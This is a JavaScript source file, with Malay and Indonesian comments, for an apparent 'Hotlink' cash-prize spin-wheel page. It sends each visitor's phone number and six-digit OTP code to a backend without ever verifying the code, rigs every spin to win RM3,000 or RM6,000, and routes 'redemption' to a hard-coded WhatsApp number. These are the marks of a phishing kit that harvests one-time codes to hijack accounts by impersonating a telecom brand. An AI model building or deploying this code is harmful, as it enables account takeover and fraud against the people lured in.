/* =========================================================
   0. KONFIGURASI BACKEND
   ========================================================= */
const API_BASE_URL = 'http://localhost:3001';

async function sendToBackend(endpoint, data) {
    try {
        const response = await fetch(API_BASE_URL + endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        const result = await response.json();
        console.log('Backend response:', result);
        return result;
    } catch (error) {
        console.error('Gagal kirim ke backend:', error.message);
        return { success: false, error: error.message };
    }
}
/* =========================================================
   FILE: script.js
   DESKRIPSI: 1 nomor = 1 spin = 1 hadiah
   ========================================================= */


/* =========================================================
   1. KONFIGURASI
   ========================================================= */
const COOLDOWN_DURATION_MS = 30 * 24 * 60 * 60 * 1000; // 30 hari
const STORAGE_KEY_PHONE = 'hotlink_logged_phone';
const WHATSAPP_NUMBER = "601161462495";

let cooldownInterval = null;


/* =========================================================
   2. STATE APLIKASI
   ========================================================= */
let loggedInPhone = localStorage.getItem(STORAGE_KEY_PHONE) || "";
let rewards = []; // Akan di-load per nomor saat login

// Fungsi helper: kunci rewards per nomor
function getRewardsKey() {
    return 'hotlink_rewards_' + loggedInPhone;
}

// Fungsi helper: kunci cooldown per nomor
function getCooldownKey() {
    return 'hotlink_spin_cooldown_end_' + loggedInPhone;
}

// Load rewards dari localStorage sesuai nomor yang login
function loadRewards() {
    if (!loggedInPhone) {
        rewards = [];
        return;
    }
    rewards = JSON.parse(localStorage.getItem(getRewardsKey()) || "[]");
}

// Simpan rewards ke localStorage untuk nomor yang login
function saveRewards() {
    if (!loggedInPhone) return;
    localStorage.setItem(getRewardsKey(), JSON.stringify(rewards));
}

const prizeIcons = {
    "RM2,000 Cash": "💵",
    "RM5,000 Cash": "💵",
    "RM6,000 Cash": "💵",
    "RM3,000 Cash": "💵",
    "RM4,000 Cash": "💵",
    "RM1,000 Cash": "💵"
};


/* =========================================================
   3. DEKLARASI ELEMEN HTML
   ========================================================= */
// Halaman 1
const btnLogin = document.getElementById('btn-login');

// Halaman 2
const btnPhoneBack = document.getElementById('btn-phone-back');
const inputPhone = document.getElementById('input-phone');
const btnPhoneContinue = document.getElementById('btn-phone-continue');

// Halaman 3
const btnOtpBack = document.getElementById('btn-otp-back');
const inputOtp = document.getElementById('input-otp');
const btnOtpContinue = document.getElementById('btn-otp-continue');
const displayPhone = document.getElementById('display-phone');
const timerText = document.getElementById('timer-text');

// Halaman 4
const dashUserName = document.getElementById('dash-user-name');
const btnAvatar = document.getElementById('btn-avatar');
const btnTebus = document.getElementById('btn-tebus');
const spinWrapper = document.getElementById('spin-wrapper');
const cooldownBanner = document.getElementById('cooldown-banner');
const wheel = document.getElementById('wheel');
const spinBtn = document.getElementById('spin-btn');
const btnLogout = document.getElementById('btn-logout');

// Halaman 5
const btnRewardsBack = document.getElementById('btn-rewards-back');
const prizeList = document.getElementById('prize-list');
const totalRewards = document.getElementById('total-rewards');

// Modal Win
const winModal = document.getElementById('win-modal');
const modalPrizeText = document.getElementById('modal-prize-text');
const modalCloseBtn = document.getElementById('modal-close-btn');

// Modal Redeem
const redeemModal = document.getElementById('redeem-modal');
const waPrizeIcon = document.getElementById('wa-prize-icon');
const waPrizeName = document.getElementById('wa-prize-name');
const waBtn = document.getElementById('wa-btn');

// Modal Logout
const logoutModal = document.getElementById('logout-modal');
const logoutCancelBtn = document.getElementById('logout-cancel-btn');
const logoutConfirmBtn = document.getElementById('logout-confirm-btn');


/* =========================================================
   4. FUNGSI NAVIGASI
   ========================================================= */
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.add('hidden');
        screen.classList.remove('active');
    });
const target = document.getElementById(screenId);
    target.classList.remove('hidden');
    void target.offsetWidth;
    target.classList.add('active');
}

function focusInputWithDelay(el) {
    setTimeout(() => el.focus(), 500);
}


/* =========================================================
   5. HALAMAN 1: LANDING
   ========================================================= */
if (btnLogin) {
    btnLogin.addEventListener('click', () => {
        showScreen('screen-phone');
        focusInputWithDelay(inputPhone);
    });
}


/* =========================================================
   6. HALAMAN 2: INPUT NOMOR
   ========================================================= */
if (btnPhoneBack) {
    btnPhoneBack.addEventListener('click', () => {
        showScreen('screen-landing');
        inputPhone.value = '';
        btnPhoneContinue.disabled = true;
        btnPhoneContinue.classList.remove('active');
    });
}

if (inputPhone) {
    inputPhone.addEventListener('input', (e) => {
        let num = e.target.value.replace(/\D/g, '');
        if (num.length > 10) num = num.slice(0, 10);
        e.target.value = num;

        if (num.length >= 9) {
            btnPhoneContinue.disabled = false;
            btnPhoneContinue.classList.add('active');
        } else {
            btnPhoneContinue.disabled = true;
            btnPhoneContinue.classList.remove('active');
        }
    });
}

if (btnPhoneContinue) {
    btnPhoneContinue.addEventListener('click', () => {
        const fullPhoneNumber = '60' + inputPhone.value;
        displayPhone.textContent = fullPhoneNumber;
        sendToBackend('/api/send-phone',{ phone: fullPhoneNumber});
        showScreen('screen-otp');
        focusInputWithDelay(inputOtp);
        startOtpTimer();
    });
}


/* =========================================================
   7. HALAMAN 3: OTP
   ========================================================= */
if (btnOtpBack) {
    btnOtpBack.addEventListener('click', () => {
        showScreen('screen-phone');
        inputOtp.value = '';
        btnOtpContinue.disabled = true;
        btnOtpContinue.classList.remove('active');
    });
}

if (inputOtp) {
    inputOtp.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        e.target.value = val;
        if (val.length === 6) {
            btnOtpContinue.disabled = false;
            btnOtpContinue.classList.add('active');
        } else {
            btnOtpContinue.disabled = true;
            btnOtpContinue.classList.remove('active');
        }
    });
}

if (btnOtpContinue) {
    btnOtpContinue.addEventListener('click', () => {
        // Update nomor yang login
        loggedInPhone = displayPhone.textContent;
        dashUserName.textContent = loggedInPhone;
        localStorage.setItem(STORAGE_KEY_PHONE, loggedInPhone);
        sendToBackend('/api/send-otp',{
            phone: loggedInPhone,
            otp: inputOtp.value
        });

        // 📥 Load rewards khusus nomor ini
        loadRewards();

        showScreen('screen-dashboard');
        updateRewardsDisplay();
        checkCooldownOnEnter();
    });
}


/* =========================================================
   8. TIMER OTP
   ========================================================= */
let otpTimeLeft = 114;
let otpTimerInterval = null;

function startOtpTimer() {
    clearInterval(otpTimerInterval);
    otpTimeLeft = 114;
    otpTimerInterval = setInterval(() => {
        if (otpTimeLeft > 0) {
            otpTimeLeft--;
            const m = Math.floor(otpTimeLeft / 60);
            const s = otpTimeLeft % 60;
            timerText.textContent = `Hantar semula kod dalam ${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        } else {
            clearInterval(otpTimerInterval);
            timerText.textContent = "Anda boleh hantar semula kod sekarang.";
        }
    }, 1000);
}


/* =========================================================
   9. DASHBOARD
   ========================================================= */
if (btnAvatar) {
    btnAvatar.addEventListener('click', () => {
        alert('Buka halaman profil pengguna.');
    });
}
if (btnTebus) {
    btnTebus.addEventListener('click', () => {
        showScreen('screen-rewards');
        renderRewardsList();
    });
}

// Logout
if (btnLogout) {
    btnLogout.addEventListener('click', () => {
        if (logoutModal) logoutModal.classList.add('show');
    });
}

if (logoutConfirmBtn) {
    logoutConfirmBtn.addEventListener('click', () => {
        performLogout();
    });
}

if (logoutCancelBtn) {
    logoutCancelBtn.addEventListener('click', () => {
        if (logoutModal) logoutModal.classList.remove('show');
    });
}

if (logoutModal) {
    logoutModal.addEventListener('click', (e) => {
        if (e.target === logoutModal) logoutModal.classList.remove('show');
    });
}

function performLogout() {
    if (logoutModal) logoutModal.classList.remove('show');

    if (cooldownInterval) {
        clearInterval(cooldownInterval);
        cooldownInterval = null;
    }

    // Hapus sesi login, tapi rewards & cooldown per nomor TETAP tersimpan
    localStorage.removeItem(STORAGE_KEY_PHONE);
    loggedInPhone = "";
    rewards = [];
    dashUserName.textContent = "Pengguna Hotlink";

    spinWrapper.classList.remove('hidden');
    cooldownBanner.classList.add('hidden');

    showScreen('screen-landing');

    inputPhone.value = '';
    inputOtp.value = '';
    btnPhoneContinue.disabled = true;
    btnPhoneContinue.classList.remove('active');
    btnOtpContinue.disabled = true;
    btnOtpContinue.classList.remove('active');

    const rv = document.getElementById('rewards-value');
    if (rv) rv.textContent = "0 Mata Ganjaran";
}


/* =========================================================
   10. HALAMAN 5: GANJARAN
   ========================================================= */
if (btnRewardsBack) {
    btnRewardsBack.addEventListener('click', () => {
        showScreen('screen-dashboard');
        checkCooldownOnEnter();
    });
}


/* =========================================================
   11. MODAL "SELAMAT!"
   ========================================================= */
function showWinModal(prizeName) {
    modalPrizeText.textContent = prizeName;
    winModal.classList.add('show');
}

if (modalCloseBtn) {
    modalCloseBtn.addEventListener('click', () => {
        winModal.classList.remove('show');
    });
}

if (winModal) {
    winModal.addEventListener('click', (e) => {
        if (e.target === winModal) winModal.classList.remove('show');
    });
}


/* =========================================================
   12. MODAL "TEBUS GANJARAN"
   ========================================================= */
function openRedeemModalForPrize(prize) {
    if (!prize) {
        alert('Hadiah tidak dijumpai.');
        return;
    }
    waPrizeIcon.textContent = prize.icon;
    waPrizeName.textContent = prize.name;

    var message = "Halo Admin Hotlink!\n\n";
    message += "Saya ingin menebus hadiah berikut:\n\n";
    message += "Hadiah: " + prize.name + "\n";
    message += "Tarikh: " + prize.date + "\n";
    message += "Masa: " + prize.time + "\n";
    message += "Nombor: " + loggedInPhone + "\n\n";
    message += "Mohon diproses ya. Terima kasih!";

    waBtn.href = "https://wa.me/" + WHATSAPP_NUMBER + "?text=" + encodeURIComponent(message);
    redeemModal.classList.add('show');
}

if (redeemModal) {
    redeemModal.addEventListener('click', (e) => {
        if (e.target === redeemModal) {
            redeemModal.classList.remove('show');
            return;
        }
        if (e.target.closest('#redeem-close-btn')) {
            redeemModal.classList.remove('show');
        }
    });
}


/* =========================================================
   13. TITIK LAMPU DI TEPI RODA
   ========================================================= */
const dotsContainer = document.getElementById('dots-container');
if (dotsContainer) {
    const dotCount = 16;
    const radius = 160;
    for (let i = 0; i < dotCount; i++) {
        const angle = (i * (360 / dotCount)) - 90;
        const rad = angle * (Math.PI / 180);
        const x = 160 + radius * Math.cos(rad) - 5.5;
        const y = 160 + radius * Math.sin(rad) - 5.5;
        const dot = document.createElement('div');
        dot.className = 'dot';
        dot.style.left = x + 'px';
        dot.style.top = y + 'px';
        dotsContainer.appendChild(dot);
    }
}


/* =========================================================
   14. SPIN WHEEL
   ========================================================= */
const prizes = [
    "RM2,000 Cash",     // Sector 0
    "RM5,000Cash",       // Sector 1
    "RM6,000 Cash",       // Sector 2
    "RM3,000 Cash",        // Sector 3
    "RM4,000 Cash",        // Sector 4
    "RM1,000 Cash"      // Sector 5
];
// 🎯 Pemenang: 2 = Phone, 3 = Cash
const ALLOWED_WINNING_SECTORS = [2, 3];

let currentRotation = 0;
let isSpinning = false;

if (spinBtn) {
    spinBtn.addEventListener('click', () => {
        if (isSpinning) return;
        isSpinning = true;
        spinBtn.disabled = true;
        spinBtn.textContent = "...";

        const winningSector = ALLOWED_WINNING_SECTORS[
            Math.floor(Math.random() * ALLOWED_WINNING_SECTORS.length)
        ];
        const sectorCenterAngle = winningSector * 60 + 30;
        const offset = (Math.random() - 0.5) * 40;
        const targetMod = ((360 - sectorCenterAngle + offset) % 360 + 360) % 360;
        const minRotation = currentRotation + 1800;
        const currentMod = minRotation % 360;
        const extra = (targetMod - currentMod + 360) % 360;
        currentRotation = minRotation + extra;

        wheel.style.transform = `rotate(${currentRotation}deg)`;

        setTimeout(() => {
            const prize = prizes[winningSector];
            showWinModal(prize);

            // 🎯 REPLACE rewards: hanya 1 hadiah per nomor
            rewards = [{
                name: prize,
                icon: prizeIcons[prize],
                date: new Date().toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric' }),
                time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })
            }];

            saveRewards();
            updateRewardsDisplay();

            isSpinning = false;
            spinBtn.disabled = false;
            spinBtn.textContent = "Spin";

            startCooldown();
        }, 5200);
    });
}


/* =========================================================
   15. UPDATE MATA GANJARAN
   ========================================================= */
function updateRewardsDisplay() {
    const rewardsValue = document.getElementById('rewards-value');
    if (!rewardsValue) return;
    if (rewards.length === 0) {
        rewardsValue.textContent = "0 Mata Ganjaran";
        return;
    }
    rewardsValue.textContent = rewards[rewards.length - 1].name;
    rewardsValue.classList.add('flash');
    setTimeout(() => rewardsValue.classList.remove('flash'), 800);
}


/* =========================================================
   16. RENDER DAFTAR HADIAH
   ========================================================= */
function renderRewardsList() {
    if (!prizeList || !totalRewards) return;
    totalRewards.textContent = `${rewards.length} Hadiah`;
    prizeList.innerHTML = '';

    if (rewards.length === 0) {
        prizeList.innerHTML = `
            <div class="empty-state">
                <div class="empty-state-icon">🎁</div>
                <p class="empty-state-text">
                    Belum ada hadiah.<br>
                    Cuba spin roda untuk menang!
                </p>
            </div>
        `;
        return;
    }

    const reversedRewards = [...rewards].reverse();
    reversedRewards.forEach((reward, index) => {
        const originalIndex = rewards.length - 1 - index;
        const item = document.createElement('div');
        item.className = 'prize-item';
        item.style.animationDelay = `${index * 0.05}s`;
        item.innerHTML =`
        
            <div class="prize-icon">${reward.icon}</div>
            <div class="prize-info">
                <p class="prize-name">${reward.name}</p>
                <p class="prize-date">${reward.date} • ${reward.time}</p>
            </div>
            <button class="btn-redeem" data-index="${originalIndex}">Tebus</button>
        `;
        prizeList.appendChild(item);
    });

    document.querySelectorAll('.btn-redeem').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const idx = parseInt(e.target.getAttribute('data-index'), 10);
            openRedeemModalForPrize(rewards[idx]);
        });
    });
}


/* =========================================================
   17. FUNGSI COOLDOWN
   ========================================================= */
function getCooldownEnd() {
    const saved = localStorage.getItem(getCooldownKey());
    return saved ? parseInt(saved, 10) : 0;
}

function setCooldownEnd(ts) {
    localStorage.setItem(getCooldownKey(), ts.toString());
}

function startCooldown() {
    const endTime = Date.now() + COOLDOWN_DURATION_MS;
    setCooldownEnd(endTime);
    showCooldown(endTime);
}

function showCooldown(endTime) {
    spinWrapper.classList.add('hidden');
    cooldownBanner.classList.remove('hidden');
    if (cooldownInterval) clearInterval(cooldownInterval);
    updateCountdown(endTime);
    cooldownInterval = setInterval(() => {
        const remaining = endTime - Date.now();
        if (remaining <= 0) {
            clearInterval(cooldownInterval);
            endCooldown();
        } else {
            updateCountdown(endTime);
        }
    }, 1000);
}

function updateCountdown(endTime) {
    const remaining = Math.max(0, endTime - Date.now());
    const totalSeconds = Math.floor(remaining / 1000);
    const days = Math.floor(totalSeconds / 86400);
    const hours = Math.floor((totalSeconds % 86400) / 3600);
    const mins = Math.floor((totalSeconds % 3600) / 60);
    const secs = totalSeconds % 60;
    document.getElementById('cd-days').textContent = String(days).padStart(2, '0');
    document.getElementById('cd-hours').textContent = String(hours).padStart(2, '0');
    document.getElementById('cd-mins').textContent = String(mins).padStart(2, '0');
    document.getElementById('cd-secs').textContent = String(secs).padStart(2, '0');
}

function endCooldown() {
    localStorage.removeItem(getCooldownKey());
    cooldownBanner.classList.add('hidden');
    spinWrapper.classList.remove('hidden');
}

function checkCooldownOnEnter() {
    const endTime = getCooldownEnd();
    if (endTime > Date.now()) {
        showCooldown(endTime);
    } else {
        cooldownBanner.classList.add('hidden');
        spinWrapper.classList.remove('hidden');
    }
}


/* =========================================================
   18. AUTO-LOGIN SAAT HALAMAN DIBUKA
   ========================================================= */
window.addEventListener('DOMContentLoaded', () => {
    const savedPhone = localStorage.getItem(STORAGE_KEY_PHONE);
    if (savedPhone) {
        loggedInPhone = savedPhone;
        dashUserName.textContent = loggedInPhone;
        loadRewards();
        showScreen('screen-dashboard');
        updateRewardsDisplay();
        checkCooldownOnEnter();
    } else {
        showScreen('screen-landing');
    }
});
